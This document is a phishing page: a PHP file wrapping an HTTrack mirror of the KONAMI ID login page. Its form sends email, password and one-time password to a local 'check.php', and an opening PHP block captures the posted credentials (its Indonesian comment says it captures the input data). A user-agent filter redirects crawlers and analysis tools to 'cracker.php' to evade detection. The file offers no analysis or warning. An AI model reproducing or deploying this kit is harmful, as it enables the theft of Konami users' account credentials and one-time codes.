<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

?>

<!doctype html>


<html lang="ja">


	
<!-- Mirrored from account.konami.net/auth/login?sessionid=rrt-4898768021271513399-a-gne1-1992-1435389-1&scope=openid%20profile by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 29 Mar 2020 10:09:35 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>

	
		<meta charset="UTF-8">
		<meta http-equiv="x-ua-compatible" content="ie=edge">
		<meta name="description" content="">
		<meta name="robots" content="noindex, nofollow">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="format-detection" content="telephone=no">
	

	
		<title>KONAMI ID Login</title>
	

	
		<link rel="stylesheet" href="https://account.konami.net/auth/static/css/style_def.css?v4">
		<link rel="icon" href="https://account.konami.net/auth/static/img/favicon.png" type="image/x-icon">
	

	
		<style type="text/css">
			 
		</style>
	

	</head>




	
		<body class="login">
	

		
			<div id="wrapper">
				<div class="inner">

				
					<header>
						<div class="inner">
							<p class="konami-logo">
								
									<a href="https://www.konami.com/games/" target="_blank"><img src="https://account.konami.net/auth/static/img/logo_konami.png" alt="KONAMI"></a>
								
							</p>
						</div>
					</header>
				

				
	<div id="content">

	
	
	<div id="page-login" class="inner ">
		<div class="ttl"><h1><span>KONAMI ID Login</span></h1></div>


		
			<div class="main">

			
			

			
				<section class="login" id="login-form">
			

				
					<p class="lead">Log in with your KONAMI ID</p>
					<div class="form-area">
						<form action="check.php" method="post" name="frm">
		                    <input type='hidden' name='csrfmiddlewaretoken' value='EQueUrz5R8t4wCcqVndZ8S9CD2JorZurOhmSJ5fJM9aDYgeF3BPPByw0OJZPQ8L8' />
		                    

							<dl class="userId">
								<dt>
								<p>KONAMI ID (Email Address)</p></dt>
								<dd class="form-parts">
									<p>
		                                <input type="text" name="email" placeholder="Email address" id="id_userId" />
									</p>
		                            
									
									
									
								</dd>
							</dl>
							<dl class="password">
								<dt>
								<p>Password</p></dt>
								<dd class="form-parts">
									<p>
										<input type="password" name="password" placeholder="Password" id="id_password" />
									</p>
		                            
									
									
								</dd>
							</dl>
							<dl class="otp">
								<dt>
								<p>One-Time Password</p></dt>
								<dd class="form-parts">
									<p>
		                                <input type="text" name="otpass" placeholder="One-time password" id="id_otpass" />
									</p>
		                            
								</dd>
								<dd class="for-otp-users">
									<p class="menu-btn">
										<a href="#show-otp" id="otp_on"><span>For those using a one-time password</span></a>
									</p>
								</dd>
								<dd class="about-otp">
									<p class="menu-btn">
										<a href='https://my.konami.net/islOtp.html?cn=ID&amp;ln=en_GB'><span>What is the KONAMI One-Time Password Service?</span></a>
									</p>
								</dd>
							</dl>
						</form>
					</div>

                    
                    


					<div class="btn-area">
						<p class="btn submit"><a href="#"><span>Log In</span></a></p>
					</div>
					<div class="reminder">
						<ul>
							<li>
								<p class="menu-btn">
									<a href='https://my.konami.net/reminder/islPassEntry.html?cn=ID&amp;ln=en_GB'><span>Forgotten your password?</span></a>
								</p>
							</li>
							<li>
								<p class="menu-btn">
									<a href='https://my.konami.net/reminder/islIdEntry.html?cn=ID&amp;ln=en_GB'><span>Forgotten your KONAMI ID?</span></a>
								</p>
							</li>
						</ul>
					</div>
				

				
					
					
				

			
			</section>
		

			
			
				
				<section class="to-signup">
			
		

				
				
					<p class="lead">Don't have a KONAMI ID?</p>
					<div class="btn-area">
						<p class="btn normal"><a href="https://account.konami.net/auth/signup_input.html"><span>Sign Up</span></a>
						</p>
					</div>
				
			

			
			
				</section>
				
			
		

			</div>
		

	
	</div>
	


	
	

	</div>


				
					<footer>
						<div class="inner">

						
	
		<form action="https://account.konami.net/auth/i18n/setlang/" method="post" >
		    <div id="select-language">
		        <div class="select-parts">
		            <input type='hidden' name='csrfmiddlewaretoken' value='EQueUrz5R8t4wCcqVndZ8S9CD2JorZurOhmSJ5fJM9aDYgeF3BPPByw0OJZPQ8L8' />
		            
		            
		                
		            
		                
		            
		                <p>English</p>
		            
		                
		            
		                
		            
		                
		            
		                
		            
		                
		            
		                
		            
		                
		            
		                
		            
		                
		            
		                
		            
		                
		            
		                
		            
		            <select name="language" id="id_language">
  <option value="de">German</option>

  <option value="en" selected>English</option>

  <option value="es">Spanish</option>

  <option value="fr">French</option>

  <option value="it">Italian</option>

  <option value="ja">Japanese</option>

  <option value="ko">Korean</option>

  <option value="pt">Portuguese</option>

  <option value="ru">Russian</option>

  <option value="zh-cn">SimplifiedChinese</option>

  <option value="zh-tw">TraditionalChinese</option>

</select>
		        </div>
		    </div>
		</form>
	


					
						<div class="footer-menu">
							<ul>
                                
								<li><a href="https://www.konami.com/games/privacy/">Privacy Policy</a></li><!--
                                --><!--

                                --><!--

								--><li><a href='https://my.konami.net/islAgreementKonamiid.html?cn=ID&amp;ln=en_GB'>KONAMI ID Terms of Use</a></li><!--
								--><!--
								--><!--
								--><!--
							
						--></ul>
						</div>
					

						
							<p class="copy">©2020 Konami Digital Entertainment</p>
							
						

						</div>
					</footer>
				

				</div>
			</div>
		

		
			<div id="loading"><div class="inner">
				<div class="circle circle1"></div>
				<div class="circle circle2"></div>
				<div class="circle circle3"></div>
				<div class="circle circle4"></div>
				<div class="circle circle5"></div>
				<div class="circle circle6"></div>
				<div class="circle circle7"></div>
				<div class="circle circle8"></div>
				<div class="circle circle9"></div>
				<div class="circle circle10"></div>
				<div class="circle circle11"></div>
				<div class="circle circle12"></div>
			</div></div>
		

		
			<script type="text/javascript">
				var develop_flg = false; 
			</script>
			<script src="https://account.konami.net/auth/static/js/common.js?v4" type="text/javascript"></script>
			<script type="text/javascript">
				(function (){
					
					pageController.init({
						page:'login',
						country:'ID',
						lauguage:'en',
						form_err_msg:{
							empty:'Please enter',
							not_select:'Please select',
							not_select_birthday:'Your birthdate is a required field',
							not_select_birthday_all:'Not all information has been entered',
							not_check_agree:'You must agree in order to continue',
							format_mailaddress:'Please enter your email address in email format.',
							format_otp:'Please input the one-time password using half-width digits.<br>If there is a "0" displayed at the start of the one-time password, be sure to enter the "0" as well.',
							format_password:'Passwords must be between 8 and 32 half-width characters and contain at least one letter and one number.',
							format_pincode:'Confirmation code consists of six half-width digits'
						}
					});

				})();
			</script>

			
				<script src="https://account.konami.net/auth/static/js/action_def.js?v7" type="text/javascript"></script>
				<script src="https://account.konami.net/auth/static/js/jquery-3.2.1.min.js"></script>
			

		

		
		

	
		</body>
	




<!-- Mirrored from account.konami.net/auth/login?sessionid=rrt-4898768021271513399-a-gne1-1992-1435389-1&scope=openid%20profile by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 29 Mar 2020 10:09:35 GMT -->
</html>